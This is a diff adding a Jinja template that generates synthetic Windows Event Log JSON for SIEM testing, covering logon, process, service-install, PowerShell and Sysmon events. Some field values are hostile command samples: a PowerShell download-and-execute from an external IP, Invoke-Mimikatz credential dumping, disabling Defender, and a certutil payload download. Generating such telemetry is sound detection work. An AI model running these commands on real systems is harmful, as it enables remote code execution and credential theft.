@@ -1,0 +1,231 @@
+{#- Windows Event Log (Winlogbeat/NXLog-style flattened JSON) — one JSON object
+    per line, use with --no-schema. Mirrors how a log shipper renders EVTX events
+    into JSON for SIEM ingestion: a common core block plus per-EventID EventData. -#}
+
+{#- ── Host pool (consistent IP per computer) ──────────────────────────────── -#}
+{%- set host_configs = {} -%}
+{%- for cfg in [
+    {'computer': 'WIN-DC01.corp.local',     'subnet': '10.10.0.0/24',  'role': 'dc'},
+    {'computer': 'WIN-DC02.corp.local',     'subnet': '10.10.0.0/24',  'role': 'dc'},
+    {'computer': 'WIN-FS01.corp.local',     'subnet': '10.10.1.0/24',  'role': 'server'},
+    {'computer': 'WIN-SQL01.corp.local',    'subnet': '10.10.2.0/24',  'role': 'server'},
+    {'computer': 'WIN-EXCH01.corp.local',   'subnet': '10.10.3.0/24',  'role': 'server'},
+    {'computer': 'WS-FIN-01.corp.local',    'subnet': '10.20.1.0/24',  'role': 'workstation'},
+    {'computer': 'WS-FIN-02.corp.local',    'subnet': '10.20.1.0/24',  'role': 'workstation'},
+    {'computer': 'WS-HR-01.corp.local',     'subnet': '10.20.2.0/24',  'role': 'workstation'},
+    {'computer': 'WS-IT-01.corp.local',     'subnet': '10.20.3.0/24',  'role': 'workstation'},
+    {'computer': 'WS-DEV-07.corp.local',    'subnet': '10.20.4.0/24',  'role': 'workstation'},
+    {'computer': 'LAPTOP-SALES-12.corp.local', 'subnet': '10.30.0.0/24', 'role': 'workstation'},
+    {'computer': 'WIN-DC03.corp.local',     'subnet': '10.10.0.0/24',  'role': 'dc'},
+    {'computer': 'WIN-FS02.corp.local',     'subnet': '10.10.1.0/24',  'role': 'server'},
+    {'computer': 'WIN-FS03.corp.local',     'subnet': '10.10.1.0/24',  'role': 'server'},
+    {'computer': 'WIN-SQL02.corp.local',    'subnet': '10.10.2.0/24',  'role': 'server'},
+    {'computer': 'WIN-EXCH02.corp.local',   'subnet': '10.10.3.0/24',  'role': 'server'},
+    {'computer': 'WIN-WEB01.corp.local',    'subnet': '10.10.4.0/24',  'role': 'server'},
+    {'computer': 'WIN-WEB02.corp.local',    'subnet': '10.10.4.0/24',  'role': 'server'},
+    {'computer': 'WIN-APP01.corp.local',    'subnet': '10.10.5.0/24',  'role': 'server'},
+    {'computer': 'WIN-APP02.corp.local',    'subnet': '10.10.5.0/24',  'role': 'server'},
+    {'computer': 'WIN-CA01.corp.local',     'subnet': '10.10.6.0/24',  'role': 'server'},
+    {'computer': 'WS-FIN-03.corp.local',    'subnet': '10.20.1.0/24',  'role': 'workstation'},
+    {'computer': 'WS-HR-02.corp.local',     'subnet': '10.20.2.0/24',  'role': 'workstation'},
+    {'computer': 'WS-IT-02.corp.local',     'subnet': '10.20.3.0/24',  'role': 'workstation'},
+    {'computer': 'WS-IT-03.corp.local',     'subnet': '10.20.3.0/24',  'role': 'workstation'},
+    {'computer': 'WS-DEV-08.corp.local',    'subnet': '10.20.4.0/24',  'role': 'workstation'},
+    {'computer': 'WS-DEV-09.corp.local',    'subnet': '10.20.4.0/24',  'role': 'workstation'},
+    {'computer': 'WS-MKT-01.corp.local',    'subnet': '10.20.5.0/24',  'role': 'workstation'},
+    {'computer': 'WS-MKT-02.corp.local',    'subnet': '10.20.5.0/24',  'role': 'workstation'},
+    {'computer': 'WS-OPS-01.corp.local',    'subnet': '10.20.6.0/24',  'role': 'workstation'},
+    {'computer': 'LAPTOP-SALES-13.corp.local', 'subnet': '10.30.0.0/24', 'role': 'workstation'},
+    {'computer': 'LAPTOP-SALES-14.corp.local', 'subnet': '10.30.0.0/24', 'role': 'workstation'},
+    {'computer': 'LAPTOP-EXEC-01.corp.local',  'subnet': '10.30.1.0/24', 'role': 'workstation'},
+    {'computer': 'LAPTOP-EXEC-02.corp.local',  'subnet': '10.30.1.0/24', 'role': 'workstation'}
+] -%}
+    {%- set _ = host_configs.update({
+        cfg.computer: {'ip': ip(cfg.subnet), 'role': cfg.role}
+    }) -%}
+{%- endfor -%}
+{%- set _ = init_pool('winhosts', host_configs) -%}
+{%- set computer = randoms(host_configs.keys()|list) -%}
+{%- set host_ip  = pool('winhosts', computer, 'ip') -%}
+
+{#- ── Common randoms ──────────────────────────────────────────────────────── -#}
+{%- set domain    = 'CORP' -%}
+{%- set user      = randoms(data.users) -%}
+{%- set subj_user = randoms('SYSTEM|SYSTEM|' ~ user ~ '|Administrator|svc_backup|svc_sql') -%}
+{%- set ext_ip    = ip(randoms('45.0.0.0/8|185.220.0.0/16|91.0.0.0/8|212.0.0.0/8')) -%}
+{%- set int_ip    = ip(randoms('10.20.1.0/24|10.20.2.0/24|10.10.0.0/24')) -%}
+
+{#- ── Event catalog (weighted toward common auth/process events) ──────────── -#}
+{%- set event_id = randoms('4624|4624|4624|4688|4688|4625|4625|4634|4672|4720|4740|1102|7045|4104|sysmon1|sysmon3') -%}
+
+{#- ── Per-event metadata + EventData ──────────────────────────────────────── -#}
+{%- set n = namespace(
+    channel  = 'Security',
+    provider = 'Microsoft-Windows-Security-Auditing',
+    level    = 'Information',
+    task     = '',
+    keywords = 'Audit Success',
+    message  = '',
+    data     = {}
+) -%}
+
+{%- if event_id == '4624' -%}
+    {%- set logon_type = randoms('2|3|3|10|10|5') -%}
+    {%- set n.task = 'Logon' -%}
+    {%- set n.message = 'An account was successfully logged on.' -%}
+    {%- set n.data = {
+        'SubjectUserName': subj_user, 'SubjectDomainName': domain,
+        'TargetUserName': user, 'TargetDomainName': domain,
+        'LogonType': logon_type|int,
+        'LogonProcessName': randoms('User32|Advapi|Kerberos|NtLmSsp'),
+        'AuthenticationPackageName': randoms('Negotiate|Kerberos|NTLM'),
+        'WorkstationName': computer.split('.')[0],
+        'IpAddress': int_ip if logon_type in ['2','5'] else randoms(int_ip ~ '|' ~ ext_ip),
+        'IpPort': integer(1024, 65535)|string,
+        'LogonId': '0x' ~ regex('[0-9A-F]{6,8}')
+    } -%}
+{%- elif event_id == '4625' -%}
+    {%- set n.keywords = 'Audit Failure' -%}
+    {%- set n.task = 'Logon' -%}
+    {%- set n.message = 'An account failed to log on.' -%}
+    {%- set n.data = {
+        'SubjectUserName': '-', 'TargetUserName': user, 'TargetDomainName': domain,
+        'LogonType': randoms('3|3|10|2')|int,
+        'Status': '0xC000006D', 'SubStatus': randoms('0xC0000064|0xC000006A|0xC0000234'),
+        'FailureReason': randoms('Unknown user name or bad password|Account locked out|Account currently disabled'),
+        'IpAddress': randoms(ext_ip ~ '|' ~ ext_ip ~ '|' ~ int_ip),
+        'IpPort': integer(1024, 65535)|string,
+        'WorkstationName': randoms('WORKSTATION|' ~ computer.split('.')[0] ~ '|-'),
+        'LogonProcessName': randoms('NtLmSsp|Kerberos|Advapi')
+    } -%}
+{%- elif event_id == '4634' -%}
+    {%- set n.task = 'Logoff' -%}
+    {%- set n.message = 'An account was logged off.' -%}
+    {%- set n.data = {
+        'TargetUserName': user, 'TargetDomainName': domain,
+        'LogonType': randoms('2|3|10')|int, 'LogonId': '0x' ~ regex('[0-9A-F]{6,8}')
+    } -%}
+{%- elif event_id == '4672' -%}
+    {%- set n.task = 'Special Logon' -%}
+    {%- set n.message = 'Special privileges assigned to new logon.' -%}
+    {%- set n.data = {
+        'SubjectUserName': subj_user, 'SubjectDomainName': domain,
+        'LogonId': '0x' ~ regex('[0-9A-F]{6,8}'),
+        'PrivilegeList': 'SeSecurityPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege'
+    } -%}
+{%- elif event_id == '4688' -%}
+    {%- set proc = randoms('powershell.exe|cmd.exe|powershell.exe|net.exe|whoami.exe|rundll32.exe|wmic.exe|mshta.exe|reg.exe') -%}
+    {%- set n.task = 'Process Creation' -%}
+    {%- set n.message = 'A new process has been created.' -%}
+    {%- set n.data = {
+        'SubjectUserName': user, 'SubjectDomainName': domain,
+        'NewProcessId': '0x' ~ regex('[0-9a-f]{3,4}'),
+        'NewProcessName': 'C:\\Windows\\System32\\' ~ proc,
+        'CommandLine': randoms(proc ~ ' -enc SQBFAFgA|' ~ proc ~ ' /c whoami|' ~ proc ~ ' -ExecutionPolicy Bypass -File C:\\temp\\u.ps1|' ~ proc),
+        'ParentProcessName': 'C:\\Windows\\System32\\' ~ randoms('explorer.exe|services.exe|svchost.exe|cmd.exe'),
+        'TokenElevationType': randoms('%%1936|%%1937|%%1938')
+    } -%}
+{%- elif event_id == '4720' -%}
+    {%- set n.task = 'User Account Management' -%}
+    {%- set n.message = 'A user account was created.' -%}
+    {%- set n.data = {
+        'SubjectUserName': subj_user, 'SubjectDomainName': domain,
+        'TargetUserName': randoms('temp_user|svc_new|jdoe_adm|backup2'), 'TargetDomainName': domain,
+        'SamAccountName': randoms('temp_user|svc_new|jdoe_adm|backup2')
+    } -%}
+{%- elif event_id == '4740' -%}
+    {%- set n.task = 'User Account Management' -%}
+    {%- set n.message = 'A user account was locked out.' -%}
+    {%- set n.data = {
+        'SubjectUserName': 'SYSTEM', 'TargetUserName': user, 'TargetDomainName': domain,
+        'CallerComputerName': randoms('WS-FIN-01|LAPTOP-SALES-12|-')
+    } -%}
+{%- elif event_id == '1102' -%}
+    {%- set n.task = 'Log clear' -%}
+    {%- set n.message = 'The audit log was cleared.' -%}
+    {%- set n.data = {
+        'SubjectUserName': randoms('Administrator|svc_admin'), 'SubjectDomainName': domain,
+        'SubjectLogonId': '0x' ~ regex('[0-9A-F]{6,8}')
+    } -%}
+{%- elif event_id == '7045' -%}
+    {%- set n.channel = 'System' -%}
+    {%- set n.provider = 'Service Control Manager' -%}
+    {%- set n.keywords = 'Classic' -%}
+    {%- set n.task = 'Service installed' -%}
+    {%- set n.message = 'A service was installed in the system.' -%}
+    {%- set n.data = {
+        'ServiceName': randoms('WinUpdateSvc|PSEXESVC|RemoteAdmin|MSSQL$BACKUP'),
+        'ImagePath': randoms('C:\\Windows\\Temp\\svc.exe|%%SystemRoot%%\\system32\\svchost.exe -k netsvcs|C:\\Users\\Public\\update.exe'),
+        'ServiceType': randoms('user mode service|kernel mode driver'),
+        'StartType': randoms('auto start|demand start'),
+        'AccountName': randoms('LocalSystem|.\\Administrator|NT AUTHORITY\\NetworkService')
+    } -%}
+{%- elif event_id == '4104' -%}
+    {%- set n.channel = 'Microsoft-Windows-PowerShell/Operational' -%}
+    {%- set n.provider = 'Microsoft-Windows-PowerShell' -%}
+    {%- set n.level = randoms('Warning|Warning|Information') -%}
+    {%- set n.keywords = 'None' -%}
+    {%- set n.task = 'Execute a Remote Command' -%}
+    {%- set n.message = 'Creating Scriptblock text.' -%}
+    {%- set n.data = {
+        'ScriptBlockText': randoms('IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.5/a.ps1\')|Get-Process | Where-Object {$_.CPU -gt 100}|Invoke-Mimikatz -DumpCreds|Set-MpPreference -DisableRealtimeMonitoring $true'),
+        'Path': randoms('C:\\temp\\update.ps1|<No file>|C:\\Users\\Public\\run.ps1'),
+        'ScriptBlockId': guid()
+    } -%}
+{%- elif event_id == 'sysmon1' -%}
+    {%- set event_id = '1' -%}
+    {%- set n.channel = 'Microsoft-Windows-Sysmon/Operational' -%}
+    {%- set n.provider = 'Microsoft-Windows-Sysmon' -%}
+    {%- set n.keywords = 'None' -%}
+    {%- set n.task = 'Process Create (rule: ProcessCreate)' -%}
+    {%- set n.message = 'Process Create.' -%}
+    {%- set sysproc = randoms('powershell.exe|cmd.exe|rundll32.exe|regsvr32.exe|certutil.exe') -%}
+    {%- set n.data = {
+        'Image': 'C:\\Windows\\System32\\' ~ sysproc,
+        'CommandLine': randoms(sysproc ~ ' -nop -w hidden -enc ZQBjAGgAbwA=|' ~ sysproc ~ ' /c net user|' ~ sysproc ~ ' -urlcache -f http://45.10.1.2/x.exe x.exe'),
+        'User': domain ~ '\\' ~ user,
+        'ParentImage': 'C:\\Windows\\System32\\' ~ randoms('explorer.exe|cmd.exe|wmiprvse.exe'),
+        'ProcessId': integer(1000, 9999)|string,
+        'ProcessGuid': '{' ~ guid() ~ '}',
+        'Hashes': 'SHA256=' ~ regex('[0-9A-F]{64}'),
+        'IntegrityLevel': randoms('Medium|High|System')
+    } -%}
+{%- else -%}
+    {#- sysmon3 — network connection -#}
+    {%- set event_id = '3' -%}
+    {%- set n.channel = 'Microsoft-Windows-Sysmon/Operational' -%}
+    {%- set n.provider = 'Microsoft-Windows-Sysmon' -%}
+    {%- set n.keywords = 'None' -%}
+    {%- set n.task = 'Network connection detected (rule: NetworkConnect)' -%}
+    {%- set n.message = 'Network connection detected.' -%}
+    {%- set n.data = {
+        'Image': 'C:\\Windows\\System32\\' ~ randoms('powershell.exe|svchost.exe|chrome.exe'),
+        'User': domain ~ '\\' ~ user,
+        'Protocol': randoms('tcp|tcp|udp'),
+        'SourceIp': host_ip, 'SourcePort': integer(1024, 65535)|string,
+        'DestinationIp': randoms(ext_ip ~ '|' ~ ext_ip ~ '|' ~ int_ip),
+        'DestinationPort': randoms('443|80|445|3389|53|4444')|int,
+        'DestinationHostname': randoms('cdn.microsoft.com|api.github.com|185-220-101-5.evil.net|-')
+    } -%}
+{%- endif -%}
+
+{#- ── Output: single flattened JSON object ────────────────────────────────── -#}
+{%- set evt = {} -%}
+{%- set _ = evt.update({
+    '@timestamp': strftime('%Y-%m-%dT%H:%M:%S.000Z'),
+    'EventID': event_id|int,
+    'Channel': n.channel,
+    'Provider': n.provider,
+    'Computer': computer,
+    'Hostname': computer.split('.')[0],
+    'EventRecordID': integer(100000, 9999999),
+    'Level': n.level,
+    'Task': n.task,
+    'Opcode': 'Info',
+    'Keywords': n.keywords,
+    'ProcessId': integer(400, 4000),
+    'ThreadId': integer(400, 9000),
+    'Message': n.message,
+    'EventData': n.data
+}) -%}
+{{ evt | tojson }}
